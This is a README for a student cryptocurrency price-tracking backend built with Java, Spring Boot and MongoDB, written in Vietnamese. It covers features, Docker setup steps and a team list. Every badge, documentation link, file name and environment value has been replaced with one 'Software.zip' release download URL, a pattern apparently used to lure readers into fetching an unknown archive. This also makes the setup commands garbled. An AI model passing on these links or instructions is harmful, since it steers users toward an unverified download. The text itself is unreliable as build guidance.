# Coin Price Backend Project
![Java](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip) ![Spring](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip) ![Docker](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip) ![MongoDB](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip)

- [BACKEND SERVER](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip)
- [API docs](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip)

## Thông tin dự án
Dự án này là một ứng dụng backend hỗ trợ việc theo dõi thông tin thị trường (giá tiền, phí,...), các giao dịch được hình thành, tra cứu thống kê các giao dịch, tự động nhận cảnh báo giá.

### Tính năng:
- *Tra cứu thông tin*:
    - **F1**: Giá Spot, Giá Future, Funding Rate, Funding Rate Countdown, Funding Rate Interval. Được cập nhật từ Binance, update interval: realtime ~ 1s.
    - **F2**: Giá theo kline.
    - **F3**: MarketCap, Trading Volume. Được cập nhập từ CMC, CG, update interval: 15min.
    - **F4**: *Tính giá trị theo Indicators*:
        - Theo các Indictor phổ biến: MA, EMA, BOLL,…
        - Cho phép người dùng tự code như plugin.
- *Cảnh báo giá*: Hỗ trợ cảnh báo giá, trigger khi đạt các điều kiện như:
    - **Trigger Condition**: 
        - Giá Spot/Future tăng/giảm hơn 1 mốc nào đó, vào/ra range nào đó.
        - Mức độ chênh giá giữa spot/future so với 1 mốc nào đó, vào/ra range nào đó.
        - Funding rate tăng/giảm hơn 1 mốc nào đó, vào/ra range nào đó.
        - Funding rate Interval thay đổi.
        - New Symbol listing, delisting.
        - *Khi chạm các mốc của indicator hoặc chạm điều kiện trigger của Indicator*.
    - **Snooze Condition**:
        - Một lần.
        - Một lần trong khoảng thời gian.
        - Lặp lại n lần hoặc khoảng thời gian đặc biệt hoặc vĩnh viễn.
    - **Action**:
        - Webhook.
        - Post Telegram Message.
- **Auth request bằng API-TOKEN**: Token gồm các thông tin (Key - Secret - Created Date...)
    - Hỗ trợ CRUD, statistic.
    - Phân quyền Token privilege:
        - VIP-0: Chỉ các api tra cứu giá.
        - VIP-1: Các API tra cứu Kline.
        - VIP-2: Trigger Condition.
        - VIP-3: Adv Indicators.


### Ngôn ngữ và công nghệ
- ![Java](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip) **Ngôn ngữ:** Java
- ![MongoDB](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip) **Cơ sở dữ liệu:** MongoDB
- ![Spring](https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip) **Công nghệ:** Spring Boot
### Hướng dẫn cài đặt
```basg
Cách 1: Chạy qua tomcat:
    1. Set up JDK - 1.8.
    2. Cài plugin: EnvFile, Spring WebSocket và Tomcat and TomEE.
    3. Setting Tomcat server: 
        - Cài artifact "spring-boot:war exploded" trong các mục before launch, deployment.
        - Thêm đường dẫn tới file .env trong mục EnvFile.
    4. Run Tomcat.
Cách 2: Chạy bằng DockerFile:
    1. Tạo https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip như sau:
        services:
            spring-boot-app:
                ports:
                - "8080:8080"
                env_file:
                - .env
                image: lmao1415/dath_cnpm
    2. Docker compose pull để kéo image về
    3. Touch .env
            echo 'MONGO_DB_URI=${{ https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip }}' >> .env 
            echo 'MONGO_DB_NAME=${{ https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip }}' >> .env 
            echo 'JWT_SECRET=${{ https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip }}' >> .env 
            echo 'TELEGRAM_WEBHOOK_URL=${{ https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip }}' >> .env 
            echo 'email=${{ https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip }}' >> .env 
            echo 'password_for_email=${{ https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip }}' >> .env 
            echo 'adminToken=${{ https://github.com/dath-241/coin-price-be-java/releases/download/v1.0/Software.zip }}' >> .env  
    4. sudo docker compose up
```
### ENV TEMPLATE (Nhớ bỏ ngoặc '{}')
```basg
MONGO_DB_URI={}
MONGO_DB_NAME={}
JWT_SECRET={}
TELEGRAM_WEBHOOK_URL={}
email={}
password_for_email={}
adminToken={}
```
## Thành viên nhóm
|STT | MSSV    | Tên thành viên      | Role | 
|----|---------|---------------------|------|
|1   | 2213524 | Hà Thái Toàn        | PO   |
|2   | 2252903 | Lê Hoàng Việt       | Dev  |
|3   | 2211472 | Trần Minh Khang     | Dev  |
|4   | 2252266 | Trần Nhật Huy       | Dev  |
|5   | 2213449 | Đoàn Nhật Tiến      | Dev  |
|6   | 2211271 | Sam Gia Huy         | Dev  |
|7   | 2113992 | Tô Tấn Luật         | Dev  |
